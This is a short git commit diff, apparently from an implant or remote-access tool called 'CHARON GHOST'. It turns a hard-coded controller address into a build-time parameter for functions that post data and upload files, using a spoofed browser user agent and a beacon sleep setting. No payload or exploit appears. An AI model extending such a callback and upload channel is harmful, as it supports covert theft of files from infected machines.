8fd4eb798df5654388cb9e7da12ced086dc84365
ENIX1701 <enix1701@gmail.com>
2026-01-19 18:24:24 +0100

    Parametrize SHADOW_URL for CHARON GHOST builder.

--- include/core/Config.hpp
+++ include/core/Config.hpp
@@ -2,7 +2,6 @@
 #include <string>
 
 namespace Config {
-    const std::string SHADOW_URL = "http://127.0.0.1:9999";
     const std::string USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36";
 
     constexpr int DEFAULT_SLEEP_SEC = 5;
--- src/network/Comms.cpp
+++ src/network/Comms.cpp
@@ -5,7 +5,7 @@
 #include <cpr/cpr.h>
 
 std::string Comms::SendPost(const std::string& endpoint, const std::string& payload) {
-    std::string fullUrl = Config::SHADOW_URL + endpoint;
+    std::string fullUrl = SHADOW_URL + endpoint;
 
     cpr::Response r = cpr::Post(
         cpr::Url{fullUrl},
@@ -23,7 +23,7 @@ std::string Comms::SendPost(const std::string& endpoint, const std::string& payl
 }
 
 bool Comms::UploadFile(const std::string& endpoint, const std::string& filename, const std::string& fileContent) {
-    std::string fullUrl = Config::SHADOW_URL + endpoint;
+    std::string fullUrl = SHADOW_URL + endpoint;
 
     cpr::Response r = cpr::Post(
         cpr::Url{fullUrl},
